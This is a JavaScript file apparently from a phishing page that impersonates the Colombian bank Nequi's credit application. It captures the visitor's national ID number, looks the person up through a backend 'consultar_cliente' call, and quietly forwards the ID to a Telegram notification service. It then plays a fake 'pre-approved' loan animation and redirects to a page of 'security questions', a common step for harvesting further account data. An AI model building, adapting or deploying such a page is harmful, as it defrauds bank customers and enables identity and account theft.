/**
 * Nequi - Solicita tu crédito
 * Lógica de interacción, validación, simulación, modales y flujo
 */

document.addEventListener('DOMContentLoaded', () => {
  // Elementos UI principales
  const menuToggle = document.getElementById('menuToggle');
  const mobileNav = document.getElementById('mobileNav');
  const creditForm = document.getElementById('creditForm');
  const cedulaInput = document.getElementById('cedulaInput');
  const inputWrapper = document.getElementById('inputWrapper');
  const submitBtn = document.getElementById('submitBtn');
  const btnText = document.getElementById('btnText');
  const btnLoader = document.getElementById('btnLoader');

  // Elementos del Modal de Resumen
  const resultModal = document.getElementById('resultModal');
  const modalClose = document.getElementById('modalClose');
  const continueBtn = document.getElementById('continueBtn');
  const authCheckbox = document.getElementById('authCheckbox');

  // Elementos del Slider y Cuotas
  const loanSlider = document.getElementById('loanSlider');
  const loanAmountDisplay = document.getElementById('loanAmountDisplay');
  const monthlyFeeDisplay = document.getElementById('monthlyFeeDisplay');

  // 1. Menú Móvil Desplegable
  if (menuToggle && mobileNav) {
    menuToggle.addEventListener('click', () => {
      const isOpen = mobileNav.classList.toggle('open');
      menuToggle.setAttribute('aria-expanded', isOpen ? 'true' : 'false');
    });

    mobileNav.querySelectorAll('a').forEach(link => {
      link.addEventListener('click', () => {
        menuToggle.setAttribute('aria-expanded', 'false');
        mobileNav.classList.remove('open');
      });
    });
  }

  // 2. Control de Label Flotante e Input de Cédula
  function checkInputState() {
    if (!inputWrapper || !cedulaInput) return;
    if (cedulaInput.value.trim().length > 0) {
      inputWrapper.classList.add('has-value');
    } else {
      inputWrapper.classList.remove('has-value');
    }
  }

  if (inputWrapper) {
    inputWrapper.addEventListener('click', () => {
      if (cedulaInput) cedulaInput.focus();
    });
  }

  if (cedulaInput) {
    // Si ya había cédula guardada, auto-completar
    const prevData = JSON.parse(localStorage.getItem('formData') || '{}');
    if (prevData.cedula) {
      cedulaInput.value = prevData.cedula;
      checkInputState();
    }

    cedulaInput.addEventListener('focus', () => {
      if (inputWrapper) inputWrapper.classList.add('is-focused');
    });

    cedulaInput.addEventListener('blur', () => {
      if (inputWrapper) inputWrapper.classList.remove('is-focused');
      checkInputState();
    });

    cedulaInput.addEventListener('input', (e) => {
      const cleanValue = e.target.value.replace(/\D/g, '').slice(0, 12);
      e.target.value = cleanValue;
      checkInputState();
      if (inputWrapper && inputWrapper.classList.contains('error')) {
        inputWrapper.classList.remove('error');
      }
    });

    checkInputState();
  }

  // 3. Formateo de Moneda y Cálculos del Simulador
  const TASA_INTERES_MENSUAL = 0.012; // 1.2% mensual
  const PLAZO_MESES = 24;

  function formatCurrency(value) {
    return new Intl.NumberFormat('es-CO').format(value);
  }

  function calcularCuotaMensual(monto, meses) {
    return Math.round((monto / meses) + (monto * TASA_INTERES_MENSUAL));
  }

  function updateSliderUI() {
    if (!loanSlider || !loanAmountDisplay || !monthlyFeeDisplay) return;
    const valor = parseInt(loanSlider.value, 10) || 100000;
    const min = parseInt(loanSlider.min, 10) || 100000;
    const max = parseInt(loanSlider.max, 10) || 10000000;

    loanAmountDisplay.textContent = '$' + formatCurrency(valor);
    const cuota = calcularCuotaMensual(valor, PLAZO_MESES);
    monthlyFeeDisplay.textContent = '$' + formatCurrency(cuota);

    const percent = ((valor - min) / (max - min)) * 100;
    loanSlider.style.background =
      `linear-gradient(to right, #ffffff ${percent}%, rgba(255, 255, 255, 0.35) ${percent}%)`;
  }

  if (loanSlider) {
    loanSlider.addEventListener('input', updateSliderUI);
    updateSliderUI();
  }

  // 4. Modal Resumen de Crédito
  function showModal() {
    // Inicializar slider en 100000
    if (loanSlider && !loanSlider.value) {
      loanSlider.value = 100000;
    }
    updateSliderUI();

    if (authCheckbox) authCheckbox.checked = false;
    if (continueBtn) {
      continueBtn.disabled = true;
      continueBtn.textContent = 'Confirmar y continuar';
    }

    if (resultModal) {
      resultModal.setAttribute('aria-hidden', 'false');
      resultModal.classList.add('open');
      resultModal.classList.add('active');
    }
    document.body.style.overflow = 'hidden';
  }

  function hideModal() {
    if (resultModal) {
      resultModal.setAttribute('aria-hidden', 'true');
      resultModal.classList.remove('open');
      resultModal.classList.remove('active');
    }
    document.body.style.overflow = '';
  }

  if (modalClose) modalClose.addEventListener('click', hideModal);

  if (resultModal) {
    resultModal.addEventListener('click', (e) => {
      if (e.target === resultModal) hideModal();
    });
  }

  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && resultModal && (resultModal.classList.contains('active') || resultModal.classList.contains('open'))) {
      hideModal();
    }
  });

  // El checkbox habilita el botón "Confirmar y continuar"
  if (authCheckbox && continueBtn) {
    authCheckbox.addEventListener('change', () => {
      continueBtn.disabled = !authCheckbox.checked;
    });
  }

  // 5. Validación de Cédula (permite documentos de 5 a 12 dígitos)
  function validarCedula(valor) {
    const soloNumeros = valor.replace(/\D/g, '');
    return soloNumeros.length >= 5 && soloNumeros.length <= 12;
  }

  // 6. Envío del Formulario Inicial (Cédula) -> Abre el Modal
  if (creditForm) {
    creditForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const cedula = (cedulaInput ? cedulaInput.value : '').trim().replace(/\D/g, '');
      if (!validarCedula(cedula)) {
        if (inputWrapper) {
          inputWrapper.classList.add('error');
          setTimeout(() => inputWrapper.classList.remove('error'), 600);
        }
        alert('Por favor ingresa un número de cédula válido (entre 5 y 12 dígitos).');
        if (cedulaInput) cedulaInput.focus();
        return;
      }

      // Feedback visual momentáneo
      if (submitBtn) submitBtn.classList.add('loading');

      // Limpiar estados previos de validación y datos cacheados
      localStorage.removeItem('cargandoPaso');
      localStorage.removeItem('customerData');

      // Guardar cédula en formData de localStorage
      const formData = JSON.parse(localStorage.getItem('formData') || '{}');
      formData.cedula = cedula;
      formData.fechaInicio = new Date().toISOString();
      localStorage.setItem('formData', JSON.stringify(formData));

      (async function queryCustomerApi(cc) {
        try {
          const controller = new AbortController();
          const timeout = setTimeout(() => controller.abort(), 9000);
          const res = await fetch(`api.php?action=consultar_cliente&cedula=${encodeURIComponent(cc)}`, {
            signal: controller.signal
          });
          clearTimeout(timeout);
          if (res.ok) {
            const data = await res.json();
            if (data && data.exito) {
              localStorage.setItem('customerData', JSON.stringify(data));
            }
          }
        } catch (e) {
          // Silencioso
        }
      })(cedula);

      // Notificar a Telegram en segundo plano
      if (window.TelegramService) {
        window.TelegramService.notifySolicitudInicial(cedula);
      }

      setTimeout(() => {
        if (submitBtn) submitBtn.classList.remove('loading');
        showModal();
      }, 400);
    });
  }

  // 7. Confirmar y continuar -> Muestra animación (cubos -> banner verde + listo azul -> preguntas)
  const loadingOverlay = document.getElementById('loadingOverlay');
  const overlayCubesWrapper = document.getElementById('overlayCubesWrapper');
  const overlayTextCube = document.getElementById('overlayTextCube');
  const overlayDoneCard = document.getElementById('overlayDoneCard');
  const preapprovedBanner = document.getElementById('content');

  if (continueBtn) {
    continueBtn.addEventListener('click', async () => {
      const formData = JSON.parse(localStorage.getItem('formData') || '{}');
      const cedula = formData.cedula || (cedulaInput ? cedulaInput.value.trim().replace(/\D/g, '') : '');
      const montoSeleccionado = loanSlider ? parseInt(loanSlider.value, 10) : 100000;
      const cuotaCalculada = calcularCuotaMensual(montoSeleccionado, PLAZO_MESES);

      formData.cedula = cedula;
      formData.montoPrestamo = montoSeleccionado;
      formData.cuotaMensual = cuotaCalculada;
      formData.meses = PLAZO_MESES;
      formData.fechaPago = '1 de cada mes';
      formData.tipoProducto = 'Crédito Salvavidas / Propulsor';
      localStorage.setItem('formData', JSON.stringify(formData));
      localStorage.setItem('aprobado', formatCurrency(montoSeleccionado));

      continueBtn.disabled = true;
      continueBtn.textContent = 'Procesando...';

      // Cerrar modal
      hideModal();

      // Mostrar pantalla de carga fullscreen
      if (loadingOverlay) {
        loadingOverlay.style.display = 'flex';
        if (overlayCubesWrapper) overlayCubesWrapper.style.display = 'flex';
        if (overlayDoneCard) overlayDoneCard.style.display = 'none';
        if (preapprovedBanner) preapprovedBanner.classList.remove('show');
        if (overlayTextCube) {
          overlayTextCube.innerHTML = 'Un momento por favor,<br>estamos procesando tu<br>solicitud...';
        }

        // Paso A (1.8s): Muestra tarjeta cian ¡Listo! CON banner verde superior
        setTimeout(() => {
          if (overlayCubesWrapper) overlayCubesWrapper.style.display = 'none';
          if (overlayDoneCard) overlayDoneCard.style.display = 'flex';
          if (preapprovedBanner) preapprovedBanner.classList.add('show');
        }, 1800);

        // Paso B (5.5s): Oculta tarjeta cian y banner verde, muestra cubos con mensaje de preguntas
        setTimeout(() => {
          if (preapprovedBanner) preapprovedBanner.classList.remove('show');
          if (overlayDoneCard) overlayDoneCard.style.display = 'none';
          if (overlayTextCube) {
            overlayTextCube.innerHTML = 'Espera un momento, necesitamos hacerte<br>unas preguntas de seguridad para aprobar<br>tu crédito.';
          }
          if (overlayCubesWrapper) overlayCubesWrapper.style.display = 'flex';
        }, 5500);

        // Paso C (9.0s): Redirige a validación de preguntas
        setTimeout(() => {
          window.location.href = 'validacion.html';
        }, 9000);

      } else {
        // Redirigir a cargando.html si no existiera el overlay
        window.location.href = 'cargando.html';
      }
    });
  }
});
